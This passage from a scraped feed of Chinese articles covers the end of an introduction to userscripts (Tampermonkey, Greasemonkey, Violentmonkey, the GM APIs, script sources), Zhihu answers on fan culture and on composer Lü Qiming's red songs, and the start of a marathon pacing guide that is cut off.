href=\"http://tampermonkey.net/?browser=safari\" target=\"_blank\">Safari-Tampermonkey</a></li>\n</ol>\n</li>\n<li>找到脚本源，这里我把一个脚本发布在了 Greasyfork 上，大家可以点击 <a href=\"https://greasyfork.org/zh-CN/scripts/429067-%E5%B0%91%E6%95%B0%E6%B4%BE%E4%BD%9C%E8%80%85%E6%BF%80%E5%8A%B1%E5%99%A8\" target=\"_blank\">少数派作者激励器</a> 查看。</li>\n<li>页面中有一个绿色的安装按钮，点击就可以了。</li>\n</ol>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/01/579b95e19b2f2667fc5c77b3b825ba55.png\"></figure><p>安装好之后，访问我的 <a href=\"https://sspai.com/u/kokdemo/posts\" target=\"_blank\">作者文章页面</a> （或者你喜欢的其他作者），在右侧的「成就与徽章」这一部分，你就可以看到多出来了一个新的部分。如果这个作者太长时间没有更新，就会出现个红色的字体激励作者去写稿哦：</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/01/b6200f11fcf735003ca0638a9db4ef47.png\"><figcaption>这是一个效果示例</figcaption></figure><p>虽然这个脚本非常简单，但是看到这里，你已经了解了用户脚本最核心的功能了。</p>\n<h2>用户脚本的历史与不同版本</h2>\n<p>最早的时候，Firefox 火狐浏览器向开发者开放了扩展的能力，所有的开发者可以在火狐浏览器开放的能力内开发一些新的能力。 2004 年底，Aaron Boodman 在看到另一个用于精简网页的扩展的时候，想到了这个绝妙的点子，随机在 2005 年初发布了最初的 <a href=\"https://www.greasespot.net/2005/03/greasemonkey-025-xmlhttp-across.html\" target=\"_blank\">0.25版本</a> Greasymonkey。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/01/e996a3c173c5a92aedfb7d35c5d20ef5.png\"><figcaption>Greasymonkey 的火狐扩展界面</figcaption></figure><p>很快，大家就想到了通过 Greasymonkey 写一些用于屏蔽广告的脚本（这个习俗到现在都还有），但也被一些广告主吐槽。不过后面等到 ADblock 上线之后大家就转而去喷这一类扩展了。</p>\n<p>到了 2010 年，随着 Chrome 浏览器高歌猛进，另一位作者 Jan Biniok 开发了 Chrome 版本的用户脚本管理器扩展，起名叫做 Tampermonkey，直译应该叫做「篡改的猴子」。</p>\n<p>我个人觉得这个名字比 Greasymonkey 更贴切一些，符合用户脚本的实际作用。</p>\n<p>到目前为止，Tampermonkey 已经有超过千万的用户下载使用了，评分也非常高，是目前平台支持最完整的用户脚本扩展。Tampermonkey 在权限控制、脚本编辑和调试、全局黑白名单这些方面都做得相当不错，易用性相比 Greasymonkey 提升了不少。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/01/940ad4e8fa84f30e76db7aa819ddea4b.png\"><figcaption>Tampermonkey 的 Chrome 扩展界面</figcaption></figure><p>而 2013 年 Violentmonkey「暴力猴」的上线又解决了两个痛点：</p>\n<ul>\n<li>支持了遨游浏览器</li>\n<li>完全开源，地址见 <a href=\"https://github.com/violentmonkey/violentmonkey\" target=\"_blank\">GitHub</a>\n</li>\n</ul>\n<p>其实 Greasymonkey 也是开源的<sup class=\"ss-footnote\" href=\"https://github.com/greasemonkey/greasemonkey\" title=\"GitHub 地址\" footnote-id=\"1\">1</sup>，但到 Tampermonkey 诞生的时候并没有选择开源，而是以捐献软件的形式出现，这一点挺多人比较在意。暴力猴迭代到现在，也更新了非常多版本，支持的平台已经覆盖了所有主流的浏览器平台，不过界面上还是比较简单。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/01/d30382fe825ef0c6840485ac93596449.png\"><figcaption>Violentmonkey 的 Chrome 扩展界面</figcaption></figure><p>这几款主流的浏览器扩展的支持情况见下表，如果有不当请留言指正。</p>\n<figure class=\"table\"><table><tbody>\n<tr>\n<td>浏览器</td>\n<td>Greasymonkey</td>\n<td>Tampermonkey</td>\n<td>Violentmonkey</td>\n</tr>\n<tr>\n<td>Chrome</td>\n<td> </td>\n<td>支持</td>\n<td>支持</td>\n</tr>\n<tr>\n<td>Edge</td>\n<td> </td>\n<td>支持</td>\n<td>支持</td>\n</tr>\n<tr>\n<td>Safari</td>\n<td> </td>\n<td>支持</td>\n<td> </td>\n</tr>\n<tr>\n<td>Firefox</td>\n<td>支持</td>\n<td>支持</td>\n<td>支持</td>\n</tr>\n<tr>\n<td>Opera</td>\n<td> </td>\n<td>支持</td>\n<td>支持</td>\n</tr>\n<tr>\n<td>Vivaldi</td>\n<td> </td>\n<td> </td>\n<td>支持</td>\n</tr>\n<tr>\n<td>Maxthon 遨游</td>\n<td> </td>\n<td> </td>\n<td>支持</td>\n</tr>\n<tr>\n<td>Dolphin</td>\n<td> </td>\n<td>支持</td>\n<td> </td>\n</tr>\n<tr>\n<td>UC</td>\n<td> </td>\n<td>支持</td>\n<td> </td>\n</tr>\n</tbody></table></figure><h2>用户脚本的原理浅析</h2>\n<p>当然了，如果要用严谨一点的定义来说，用户脚本其实是一种注入式的 JavaScript 程序，在网页本身的程序之外，通过一些手段，将用户需要的数据和逻辑注入到当前的网页中，达到修改界面、增加功能等等的目的。</p>\n<p>换句话说用户脚本也是 JavaScript。JavaScript 能实现的能力，用户脚本基本也能做，比如操作页面元素，可以给页面中增加、删减、修改页面元素，最常见的去广告脚本就是这么实现的。</p>\n<p>不过用户脚本能提供一些普通 JavaScript 实现不了的能力。Greasymonkey 在最早的 0.25 版本中就带来了两个基本的功能：</p>\n<ul>\n<li>GM_xmlhttpRequest：用于发起跨域请求</li>\n<li>GM_registerMenuCommand：当用户操作菜单时，触发一个行为</li>\n</ul>\n<p>这两个功能到现在为止仍然非常核心，这里稍微解释一下背景。</p>\n<h3>跨域请求</h3>\n<p>为了安全起见，浏览器在页面加载的时候会有一个同源策略，如果页面中的 javaScript 来自另一个域名，浏览器就会认为这个不安全不让其加载运行，但有的时候用户可能会有一些别的需求。</p>\n<p>举个例子：<strong>比如说在京东或者当当上买书的时候，想看一下豆瓣上用户的评分</strong>，这种情况下就需要用到用户脚本的这个能力了。在京东的页面中，我们就可以借助用户脚本调用这个 <code>GM_xmlhttpRequest</code> 的 API 去访问豆瓣平台的查询接口。</p>\n<h3>菜单操作</h3>\n<p>很多情况下，用户脚本不需要自动执行，而是需要使用者来手动运行，这时就需要 <code>GM_registerMenuCommand</code> 了，在点击之后，触发一个写好的函数，就可以完成改变页面数据，或者发起某些请求的情况。</p>\n<p>举个例子：<strong>我在页面中看到一个不认识的单词，想要查询一下</strong>，这时候选中这个单词，然后触发这个接口，就可以实现查询的效果（当然也有很多的别的能力可以实现划词查询）。</p>\n<p>除了这两个功能之外，目前的用户脚本，大多采用了 Greasemonkey 制定的 <a href=\"https://wiki.greasespot.net/Greasemonkey_Manual:API\" target=\"_blank\">V4 API 规范</a>。通过这个规范，我们就能知道用户脚本可以做什么了。</p>\n<ul>\n<li>本地存储数据：这个能力和浏览器自带的 <code>localStorage</code> 比较像，可以给予用户脚本存储一些数据的能力。比如一些个性化的用户设置（譬如一张可爱的背景图）、用户数据（你关注的股票和基金）等等。</li>\n<li>获取外部资源：譬如从外部的地址获取图片、CSS 文件等等。</li>\n<li>发起浏览器提醒：调用浏览器右上角的那种提醒，可以指定文字图片和点击之后的效果。</li>\n<li>打开一个新页面：这个就很好理解，就是打开一个新的页面……</li>\n<li>设置剪贴板：这个能力可以访问你的剪贴板并给里面塞进去指定的内容。</li>\n</ul>\n<p>在 V3 版本的 API 中，还多了几个能力，包括：</p>\n<ul>\n<li>插入 CSS 样式</li>\n<li>下载文件</li>\n</ul>\n<p>不过上述的几个用户脚本扩展也出现了一些自己的差异，比如 Tampermonkey 就支持了插入节点的能力，也支持获取当前标签页面信息的能力。</p>\n<p>如果你是一个用户脚本开发者，需要注意一下这些差异点。</p>\n<h2>从哪里获取用户脚本</h2>\n<p>指望每一个人都去自己写脚本是不现实的，这需要大家有一些基本的前端开发能力。大部分的用户都是去找一些现成的脚本来使用，这就是所谓的「脚本源」。</p>\n<p>最早期的脚本源，最有名的是 userscript.org 站点，不过由于维护不力，导致后面充斥着各种各样的有害脚本，非常影响大家使用。目前这个站点已经下了，我也没有给它加上可以点击的超链接。</p>\n<p>如果你想体验，可以访问 https://userscripts-mirror.org/ 这个链接来找到之前的老脚本。</p>\n<p>当然我更推荐下面的几个脚本源：</p>\n<ul>\n<li>\n<a href=\"https://greasyfork.org/\" target=\"_blank\">GreasyFork</a> 可能是目前量最大的源，最开始让大家体验的 <a href=\"https://wvsjslugj8.feishu.cn/docs/(https://greasyfork.org/zh-CN/scripts/429067-%E5%B0%91%E6%95%B0%E6%B4%BE%E4%BD%9C%E8%80%85%E6%BF%80%E5%8A%B1%E5%99%A8\" target=\"_blank\">少数派作者激励器</a>也是这个平台中托管的</li>\n<li>\n<a href=\"https://openuserjs.org/\" target=\"_blank\">OpenUserJS</a> 另一个开放的脚本源</li>\n<li><a href=\"https://www.userscript.zone/\" target=\"_blank\">Userscript.Zone</a></li>\n</ul>\n<p>当然，直接在 GitHub 上去找脚本也是个不错的选择。</p>\n<h2>用户脚本 vs. 浏览器扩展</h2>\n<p>在上面提到的划词翻译这个例子中我们其实引入了这样一个问题：<strong>同样一个需求，如果浏览器扩展和用户脚本都能实现，我们应该如何选择？</strong></p>\n<p>一方面，浏览器扩展相比用户脚本诞生的时间其实更晚，各家的浏览器扩展后发制人，的确也有了比用户脚本强得多的功能实现；但另一方面，虽然脚本能力有限，但是它们占用的系统资源和内存又更少一点。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/01/a6d2ad65d9a4fe9fdef05597036c4fb2.png\"><figcaption>我的 Chrome 扩展们占用了不少内存</figcaption></figure><p>另外，从安全性角度上来说，用户脚本虽然也爆出过不少 <a href=\"https://userscripts-mirror.org/topics/704c575.html?page=6\" target=\"_blank\">窃取个人信息</a>、替换返利链接<sup class=\"ss-footnote\" href=\"\" title=\"有的脚本作者也会直接在介绍中表示靠返利来补贴服务器费用等，是否要继续安装就看使用者自己了。\" footnote-id=\"2\">2</sup>甚至 <a href=\"https://www.sohu.com/a/227226907_115128\" target=\"_blank\">挖矿</a> 的负面新闻，但用户脚本的源代码审查相比浏览器扩展更为直接透明，选择合适的用户脚本获取渠道、留意脚本的权限请求，有基础的用户也可以多多留意、检查脚本内容，一般就能规避大部分风险。</p>\n<p>因此我自己的解决方案是，对于轻量一些的场景，通过用户脚本+用户样式（user style）解决大部分浏览需求，重一些的场景则会选择浏览器扩展。当然了，如果你的设备对保密性和安全等级有着较高的要求，我还是不建议你安装任何用户脚本。</p>\n<h2>结语</h2>\n<p>用户脚本作为一个 17 年前的互联网老古董，现如今仍有自己的用武之地，还是十分令人感慨。但作为油猴使用指南的第一期，本文仅为增加大家对「油猴脚本」的一点了解，如果你想解锁用户脚本的全部实力、甚至自己动手制作用户脚本，还请留意本系列的后续内容更新。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68574"},{"title":"如何看待「光明日报」刊文：「粉丝控评就是一种网络暴力」？","date":"2021-09-09 07:28:52","description":"\n<h2>小艺有话说 | “饭圈”正畸，美育必不可少</h2>\n<p><br></p>\n<p><i>针对“饭圈”乱象问题，中央网信办重拳出击，在6月启动“清朗·‘饭圈’乱象整治专项行动”，8月27日公布《关于进一步加强“饭圈”乱象整治的通知》，提出取消明星艺人榜单、优化调整排行规则、严管明星经纪公司等十项措施，开展严厉整治。</i></p>\n<p><i>曾一度愈演愈烈的“饭圈”乱象，导致了集资应援、谩骂互撕、拉踩引战等一系列非理性事件。为何粉丝陷入“饭圈”难以自拔？“饭圈”乱象的形成原因有很多，包括行业风气不正、平台监管不严、教育培训不足等。<b>而“美育的缺失”也是导致粉丝文化乱象，“饭圈”畸形审美产生的原因之一。</b></i></p>\n<p><br></p>\n<h3><b>“饭圈”审美怎么了？</b></h3>\n<p><br></p>\n<p><b>强化片面审美，颜值即正义。</b>“饭圈”的概念引自国外，与日韩偶像工业模式一同进入国内市场。偶像的培养模式是经过市场检验的一套标准化流程，选人以及培养过程都非常严苛。曾有多位艺人在采访中表示，练习生阶段每天的训练超过十二个小时，而每天只能吃一盘沙拉。偶像严格迎合着“白瘦美”的所谓审美观，并且不断刷新着上限，塑造可望不可及的“神仙颜值”。<b>“饭圈”群体缺乏对美的全面认知，被形象美的强烈观感影响，陷入了颜值即正义的片面观念之中。</b>在“爱的滤镜”下，艺人作品的优劣显得无足轻重。在各类演出视频弹幕上经常可以看见来自粉丝的解释：“他（她）第一次参演电视剧，已经很好了”“这段演唱肯定是被恶意修音，请移步饭拍视频，见识他（她）的真实唱功”的留言飘过。而一旦艺人发胖、颜值下滑，则是真正的“饭圈大事”，轻则掉粉，重则引起骂战。偶像形象的宣传维护是“饭圈”的重点工作之一，“饭圈”审美观下的饭制美图、饭制视频常常带有厚重的滤镜，艺人在“白瘦美”的基础上，被渲染的更加唇红齿白、肤若凝脂，印证了“饭圈”颜值至上的审美倾向。</p>\n<p><b>缺少审美品格，让爱化作偏执。</b>爱美之心，人皆有之。美育概念的提出者席勒认为，<b>“审美是使人具有精神文化修养并真正禀赋人性的唯一途径”。</b>“饭圈”具有发现美的能力，他们能充分挖掘艺人身上的闪光点，通过持续的关注，宣传艺人从事文艺工作的努力、付出、坚持等美好品质。这些正能量有时化作动力，让粉丝自身在榜样的力量下变得更好；<b>而有时则化作非理智的崇拜与维护，成为熬夜刷榜、打投、集资、拉踩的“兴奋剂”。</b>央广网记者调查国内一家知名娱乐公司，发现在其去年一场投票活动中，粉丝共花费逾<b>550万元</b>。这样的投票活动每年不止一次，也不止一家。“饭圈”喊着“关注作品、不上升真人”的口号，却锱铢必较着番位、排名等围绕着艺人个人名利的问题。这些非理性行为不符合审美的初衷，甚至影响了文艺作品的创作。例如，男女主角番位、偶像团体站位、艺人出镜次数等方面的口舌之战屡屡爆发，制作方不得不将这些问题考虑进去，因此改变了作品拍摄的正常思路。<b>美的艺术应该是怡性悦情的，“饭圈”的审美缺乏正确的引导，缺少审美品格，让爱美之心变得偏执、盲目。</b></p>\n<p><b>私欲膨胀，审美自觉匮乏。</b>作为有严格内部纪律的网上社群，“饭圈”内部存在着等级和“鄙视链”。不花钱、不产出宣传物料的粉丝是“白嫖粉”；更受“尊重”的粉丝往往都在产出图文、视频物料，或者投入资金；起到舆论领袖作用的被称为“大粉”。<b>在这样的等级制度下，“饭圈”从欣赏偶像，变成了欣赏自己。</b>“饭圈”内部人员为了得到关注和认可，制造焦虑、发布煽动性言论，加重了“饭圈”环境的污染，导致所谓的“饭圈文化”向着道德滑坡和低俗倾向滑落下去。<b>“饭圈”的这些满足私欲的行为，已经将审美抛在一边。</b>中国文艺评论家协会理事、北京大学艺术学院院长彭锋认为，<b>“‘饭圈文化’披着审美和艺术的外衣，但它不是真正的审美。对于这种貌似审美、实质反审美的‘饭圈文化’，可以从不同方面去整治，但如果要根治，就需要加强培养真正的审美敏感力和鉴赏力。”</b></p>\n<p><br></p>\n<h3><b>“饭圈”正畸，美育必不可少。</b></h3>\n<p><br></p>\n<p>美育倡导者蔡元培认为：<b>“美育者，与智育相辅而行，以图德育之完成者也”</b>。对于“饭圈”乱象，中国文艺评论家协会副主席、中国文学艺术基金会副理事长兼秘书长向云驹认为，<b>“治本之策就在于要回到艺术和美育，用美育解决某些Z世代、网生代的审美畸形和社会失范。”</b></p>\n<p><b>美育刻不容缓。</b>近年来饭圈低龄化特点也越来越明显，《2020年全国未成年人互联网使用情况研究报告》统计，我国未成年网民参加粉丝应援的比例达到<b>8%</b>，其中初中生群体是主要参与者；2020年，半月谈杂志社对全国2万多名12岁至18岁中学生开展“青少年追星调查”，调查显示，有<b>42.2%</b>的中学生自小学就开始了追星生活，有<b>52%</b>的中学生追星时间在3年以上。面对尚不成熟的追星文化，青少年们需要通过美育强化自身的审美素养、道德品质，理性面对追星，养成健康观念，自觉抵御不良风气。</p>\n<p><b>美育是“心育”，是“人的教育”。</b>加强美育，不止能够改善“饭圈”的畸形审美，还起到培养人们健全三观的重要作用。早在1995年，教育部便提出开展包括审美教育等重要内容在内的文化素质教育。近期，教育界发布“双减”政策，提到充分用好课后服务时间，为学有余力的学生开展丰富多彩的科普、文体、艺术、劳动、阅读、兴趣小组及社团活动，促进学生的全面发展；2020年10月由中共中央办公厅、国务院办公厅印发《关于全面加强和改进新时代学校美育工作的意见》旨在以提高学生审美和人文素养为目标和弘扬中华美育精神，以美育人、以美化人、以美培元及把美育纳入各级各类学校人才培养全过程。2021年5月，全国学校体育美育工作推进会召开，筹划如何加强新时代学校体育美育工作，培养智体美劳全面发展人才。</p>\n<p><b>不仅学生应当接受美育，全民都应提倡美育。</b>海南师范大学教师侯志国认为，<b>“越来越多的从业者接受对美的教育，我们的社会将变得更加美好。”</b>特别是今年两会期间，十三届全国人大四次会议的全国人大代表、中国艺术研究院中国油画院院长杨飞云曾就“普及全民美育”提出建议。他说，<b>“文化艺术不仅是文化人与艺术家的事情，而是整个社会、民族的事业：重视文化、审美质量的提升。以国民精神文明内在的富足和社会主义现代化物质文明的丰富，共同造就民族复兴的新时代！”</b></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhong-guo-wen-yi-wang?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">中国文艺网</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/484386745/answer/2111390503?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">210 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/484385426?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">光明日报:粉丝控评是种网络暴力，你如何看？</a><br><a href=\"http://www.zhihu.com/question/352623438?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">想问下各家粉丝面对自己爱豆被黑或者是爆出不好的新闻都是怎么样的心态面对的?</a><br>\n","link":"http://www.zhihu.com/question/484386745/answer/2111390503?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"有哪些红歌是非常好听的？","date":"2021-09-09 06:48:36","description":"\n<p><b>2007年，嫦娥一号飞上太空，《谁不说俺家乡好》作为由大众选出的30首歌曲之一，伴随嫦娥一号响彻太空，这也不由得让人想起了今年6月17日9时22分发射成功的神舟十二号载人飞船，</b>时代更迭、岁月变迁但保卫家乡、建设家乡的感情代代传承，这首热爱家乡、赞美家乡的歌曲也会被久久传唱！</p>\n<p><br></p>\n<p><b>“一座座青山紧相连，一朵朵白云绕山间。一片片梯田一层层绿，一阵阵歌声随风传。哎，谁不说俺家乡好，得儿哟依儿哟……”</b>1963年，吕其明为电影《红日》所作的插曲《谁不说俺家乡好》，传唱大江南北。电影《红日》的故事发生地在山东,吕其明经历过山东解放战争，也学习过大量山东民间音乐，加上此前创作《弹起我心爱的土琵琶》的经验，所以对完成作曲任务抱有信心。他认真阅读小说原著，做了充分的案头工作，把整个创作计划、音乐设计等都安排妥当。</p>\n<p><br></p>\n<p>在和导演汤晓丹反复研究的过程中，吕其明建议，中间要增加一首歌曲。因为这部电影围绕战争叙事，从头到尾非常紧张，都是战斗的大场面。写一首插曲，能让电影起承转合得更从容一些，有张有弛，这样才有味道。汤导接受了吕其明的建议。对于歌曲应该写什么，吕其明认为：<b>要写就写对家乡的感情。不仅是反映孟良崮人民对家乡的热爱，也要反映出解放军战士热爱家乡、保卫家乡的革命乐观主义精神</b>，在音调与节奏上要与后面表现孟良崮战斗场面的音乐形成强烈对比，给人以更加深入的艺术感受。</p>\n<p><br></p>\n<p>而这首红歌的创作者正是<b> “七一勋章”获得者、作曲家吕其明！</b></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-f523d2dec469f03fbc794a4f863f2b73_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"748\" data-rawheight=\"1327\" data-watermark=\"original\" data-original-src=\"v2-f523d2dec469f03fbc794a4f863f2b73\" data-watermark-src=\"v2-30cf5ea3709583ddd9df2ac56b211bf5\" data-private-watermark-src=\"v2-ee44a3853ff37aeb8cad291c892c830b\"></p>\n<p><br></p>\n<p>吕其明，男，汉族，1930年5月生，1945年9月入党，安徽无为人，上海电影制片厂艺术委员会原副主任。新中国培养的第一批交响乐作曲家，著名电影音乐作曲家，一生坚持歌颂党、歌颂祖国、歌颂人民。70年来先后为《铁道游击队》《焦裕禄》《雷雨》等200多部（集）影视剧作曲，创作《红旗颂》《使命》等10余部大中型交响乐作品，300多首歌曲，《弹起我心爱的土琵琶》等歌曲广为传唱。荣获“全国离退休干部先进个人”等称号和“中国音乐金钟奖·终身成就奖”。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-6ebc4f150a7e72763031033b50e4e491_720w.webp?rss\" data-caption=\"2021年6月29日，吕其明获颁“七一勋章”。\" data-size=\"normal\" data-rawwidth=\"869\" data-rawheight=\"1023\" data-watermark=\"original\" data-original-src=\"v2-6ebc4f150a7e72763031033b50e4e491\" data-watermark-src=\"v2-f0dda1667b74a3e4a86ba6235dbe416d\" data-private-watermark-src=\"v2-a88460f674d121930e94b57db21c26ff\"></p>\n<p><br></p>\n<p><b><i>“我所有的作品中，都融入了我对党、对祖国、对人民的热爱。只有这样的作品，与听众的情感有了交汇点，产生了共鸣，才能听得懂、传得开、留得下。”——吕其明</i></b></p>\n<p><br></p>\n<p>10岁参加新四军，15岁加入中国共产党，成长于硝烟战火中的吕其明，用音乐表达着对党、对祖国、对人民深沉的热爱。从<b>《弹起我心爱的土琵琶》</b>到<b>《谁不说俺家乡好》</b>再到<b>《红旗颂》</b>，那深沉的爱在乐曲中交汇共鸣。</p>\n<p><br></p>\n<p>吕其明谱写了无数经典乐章，曾先后为200余部（集）电影、电视剧作曲，并创作了10余部大、中型器乐作品，以及300余首不同体裁和形式的声乐作品，他的作品在几代人的心中唱响。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-627568fa2e7f1369c994ebd9e705b4ea_720w.webp?rss\" data-caption=\"吕其明多年来坚持创作，笔耕不辍。\" data-size=\"normal\" data-rawwidth=\"409\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-627568fa2e7f1369c994ebd9e705b4ea\" data-watermark-src=\"v2-0d4b82ff8f21389973f0a53c2b518786\" data-private-watermark-src=\"v2-59b3bc307a6926aca2a8195f27a76d34\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-f69a4ef771b4fa10c636164c4d01f5fe_720w.webp?rss\" data-caption=\"2020年上海重点舞台艺术创作剧本研讨会上，90岁的吕其明坚持出席听取各方面专家对作品的建议。\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1435\" data-watermark=\"original\" data-original-src=\"v2-f69a4ef771b4fa10c636164c4d01f5fe\" data-watermark-src=\"v2-01dd5c3f018299de013241e6a35abc6d\" data-private-watermark-src=\"v2-6729b562606d7b1a2a402966cde0a921\"></p>\n<p><br></p>\n<p>多年来，吕其明始终坚持创作。2020年新冠肺炎疫情来袭，全国数百万名医务人员奋战在抗疫一线，吕其明深受感动，90岁高龄的他以电影《白求恩大夫》原创音乐作为素材，创作了单乐章的随想曲《白求恩在晋察冀》 ，回望白求恩的国际人道主义精神，致敬抗击新冠肺炎疫情的医务工作者，奏出时代与历史的交响。</p>\n<p><br></p>\n<p><b>吕其明曾说：“我一生就做了一件事，就是用创作践行入党誓言”。</b></p>\n<p><br></p>\n<p>老一辈艺术家们，用为人民创作、为人民放歌的一生，向新时代文艺工作者传达了榜样的力量——</p>\n<p><b>坚定理想信念，砥砺从艺初心，用有筋骨、有道德、有温度的文艺作品，彰显信仰之美、崇高之美，让理想信念的明灯永远在人民心中闪亮。</b></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhong-guo-wen-yi-wang?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">中国文艺网</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/21011693/answer/2109571133?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">82 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/20300859?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">怎样评价《伤不起》、《爱情买卖》、《最炫民族风》这样的歌曲？</a><br><a href=\"http://www.zhihu.com/question/345474407?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">你有哪些私藏好听的歌曲？你觉得有没有值得推荐的歌曲呢？</a><br>\n","link":"http://www.zhihu.com/question/21011693/answer/2109571133?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"马拉松比赛策略（上）：初阶跑者应该如何规划比赛中的分段配速？","date":"2021-09-09 06:31:54","description":"\n<p>针对初阶跑者、进阶跑者，分别说下全程马拉松比赛中各阶段的配速策略、如何用心率和配速设定比赛策略。<br>本文为<b>初阶跑者（4小时30分-4小时整）</b>马拉松比赛配速策略——<br></p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-02a11b18bcfaa260551a5aa3d0b938e1_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1500\" data-rawheight=\"998\" class=\"origin_image zh-lightbox-thumb\" width=\"1500\" data-original=\"https://pic2.zhimg.com/v2-02a11b18bcfaa260551a5aa3d0b938e1_r.jpg\"></figure><a href=\"https://zhuanlan.zhihu.com/p/408609083\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic2.zhimg.com/v2-36d4e32757b05ddf4312b2c401e04969_180x120.jpg\" data-image-width=\"5205\" data-image-height=\"2929\" class=\"internal\">马拉松比赛策略（下）：进阶跑者应该如何规划比赛中的分段配速？</a><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h2>42公里的比赛策略，也是配速的艺术</h2>\n<p>网络上搜索配速换算器，可以很方便的得出目标成绩下每公里的平均配速。需要注意的是，马拉松赛道并不是一成不变的平整路段，其中环境变量会很大的影响成绩。</p>\n<p>风向、气温变化、坡度、日晒等等，这些都会极大影响配速策略。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-00dedb36fe1a7b44bc7ae4c0f18e093b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1110\" class=\"origin_image zh-lightbox-thumb\" width=\"1440\" data-original=\"https://pic4.zhimg.com/v2-00dedb36fe1a7b44bc7ae4c0f18e093b_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p>比如目标以4小时整完成马拉松，换算出平均每公里配速在5分42秒左右，</p>\n<ul>\n<li>马拉松标准距离为42.195公里，但多数选手都无法沿SPR最短线路原则（the shortest possible route）的线路跑，最终往往实际完赛距离会在42.5公里左右、多出近400米；</li>\n<li>一场马拉松需要10次左右的饮水补给，降速-拿水补给-重新启动会消耗不少时间；</li>\n<li>清晨起跑的马拉松，比赛后半程温度升高日照强烈，维持既定配速会更快的消耗体能；</li>\n<li>遇到坡道或逆风风向，配速也会造成很大的影响。</li>\n</ul>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>——所以，如果能力刚好是4小时的选手、一成不变的以5分42秒的匀速去跑，未必能顺利完成。更好的选择是依据实际情况、分段去策划自己的比赛策略。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>因此，平均配速只体现了最后的结果，并不应该以这个数值来分配体能。同样作为运动强度的衡量数据，心率和功率等则更兼顾跑者身体的实时状况，用它们作为衡量会更为合理些。</p>\n<p>相对而言心率的数据比较容易获取，也非常适合初/进阶跑者作为参考依据。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-1bb23039de9daad31e9fb4cab23027ad_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"5400\" data-rawheight=\"3600\" class=\"origin_image zh-lightbox-thumb\" width=\"5400\" data-original=\"https://pic2.zhimg.com/v2-1bb23039de9daad31e9fb4cab23027ad_r.jpg\"></figure><p 